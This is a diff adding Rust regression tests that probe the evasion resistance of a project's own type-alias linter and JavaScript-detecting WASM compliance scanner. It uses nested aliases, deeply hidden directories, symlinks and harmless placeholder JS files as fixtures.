+    /// Define nested type aliases: `type Internal = Rc<T>; type External = Internal;`
+    /// Use `External::new()`.
+    ///
+    /// Goal: Test the depth of the linter's alias resolution.
+    ///
+    /// FINDING: Tests multi-level type alias resolution
+    #[test]
+    fn regression_alias_of_alias_shadowing() {
+        let mut linter = StateSyncLinter::new();
+
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+// Level 1 alias
+type Internal<T> = Rc<RefCell<T>>;
+
+// Level 2 alias (alias of alias)
+type External<T> = Internal<T>;
+
+// Level 3 alias (deeper nesting)
+type PublicApi<T> = External<T>;
+
+struct State {
+    value: i32,
+}
+
+fn spawn_worker(&self) {
+    // Use the deeply nested alias
+    let state = PublicApi::<State>::new(RefCell::new(State { value: 42 }));
+
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        // Check if linter detected all alias levels
+        let alias_errors: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| e.rule == "WASM-SS-006")
+            .collect();
+
+        let caught_deep_alias = report.errors.iter().any(|e| {
+            e.message.contains("PublicApi")
+                || e.message.contains("External")
+                || e.message.contains("Internal")
+        });
+
+        if alias_errors.len() < 3 {
+            eprintln!(
+                "🟡 WARNING: Linter found {} alias levels, expected 3.\n\
+                 Deeply nested type aliases might escape detection.\n\
+                 Found: {:?}",
+                alias_errors.len(),
+                alias_errors.iter().map(|e| &e.message).collect::<Vec<_>>()
+            );
+        }
+
+        if !caught_deep_alias {
+            eprintln!(
+                "🔴 FALSIFIED: Linter missed `PublicApi::<T>::new()` usage!\n\
+                 Type alias chain: PublicApi -> External -> Internal -> Rc"
+            );
+        } else {
+            eprintln!(
+                "✅ PASS: Linter detected alias chain (found {} levels)",
+                alias_errors.len()
+            );
+        }
+    }
+
+    // ========================================================================
+    // HYPOTHESIS C: "Hidden Directory Depth is Finite"
+    // ========================================================================
+
+    /// ATTACK: Deep Dot Directory
+    ///
+    /// Create `target/.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/malware.js`
+    ///
+    /// Goal: Verify if scanner has a depth limit or handles deeply nested hidden structures.
+    ///
+    /// FINDING: Tests deep hidden directory traversal
+    #[test]
+    fn regression_deep_dot_attack() {
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create 10 levels of hidden directories
+        let mut deep_path = target_dir;
+        for letter in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'] {
+            deep_path = deep_path.join(format!(".{}", letter));
+        }
+        fs::create_dir_all(&deep_path).expect("mkdir deep path failed");
+
+        // Create malware.js at the bottom
+        let malware = deep_path.join("malware.js");
+        fs::write(&malware, "console.log('deep hidden malware');").expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🔴 FALSIFIED: Scanner missed JS in 10-level deep hidden directory!\n\
+                     Path: target/.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/malware.js\n\
+                     RECOMMENDATION: Remove depth limit or increase to >10."
+                );
+            } else if check
+                .details
+                .as_ref()
+                .map(|d| d.contains("malware.js"))
+                .unwrap_or(false)
+            {
+                eprintln!("✅ PASS: Scanner found JS in 10-level deep hidden directory");
+            } else {
+                eprintln!("✅ PASS: Scanner failed compliance (found something in deep dirs)");
+            }
+        }
+    }
+
+    /// ATTACK: External Symlink Escape
+    ///
+    /// Create a symlink in target/ pointing to a .js file outside the project tree.
+    ///
+    /// Goal: Does the scanner follow symlinks to locations not covered by Zero-JS scope?
+    ///
+    /// FINDING: Tests symlink following behavior
+    #[test]
+    #[cfg(unix)]
+    fn regression_external_symlink_escape() {
+        use std::os::unix::fs::symlink;
+
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create external JS file in /tmp
+        let external_js = std::env::temp_dir().join("smuggle_external_12345.js");
+        fs::write(&external_js, "console.log('external smuggle');").expect("write failed");
+
+        // Create symlink from target/ to external file
+        let link_path = target_dir.join("link_to_external.js");
+        if symlink(&external_js, &link_path).is_err() {
+            // Cleanup and skip
+            let _ = fs::remove_file(&external_js);
+            eprintln!("⏭️ SKIP: Could not create symlink (permissions)");
+            return;
+        }
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        // Cleanup
+        let _ = fs::remove_file(&external_js);
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🟡 DOCUMENTED: Symlink to external .js file detected.\n\
+                     Scanner correctly followed symlink to external location.\n\
+                     NOTE: This is expected behavior - symlinks within target/ are suspicious."
+                );
+            } else {
+                eprintln!("✅ PASS: Scanner detected symlinked external .js file");
+            }
+        }
+    }
+
+    /// ATTACK: Mixed Hidden/Normal Directory Tree
+    ///
+    /// Create a complex structure: `target/normal/.hidden/another/js.file`
+    ///
+    /// Goal: Test scanner behavior with alternating hidden/normal directories.
+    ///
+    /// FINDING: Tests mixed directory traversal
+    #[test]
+    fn regression_mixed_hidden_normal_tree() {
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create alternating hidden/normal structure
+        // target/release/.cache/wasm-pack/scripts/worker.js
+        let complex_path = target_dir
+            .join("release")
+            .join(".cache")
+            .join("wasm-pack")
+            .join("scripts");
+        fs::create_dir_all(&complex_path).expect("mkdir complex path failed");
+
+        let worker_js = complex_path.join("worker.js");
+        fs::write(&worker_js, "self.onmessage = () => {};").expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🔴 FALSIFIED: Scanner missed JS in mixed hidden/normal tree!\n\
+                     Path: target/release/.cache/wasm-pack/scripts/worker.js"
+                );
+            } else {
+                eprintln!("✅ PASS: Scanner found JS in mixed hidden/normal directory tree");
+            }
         }
     }
 }
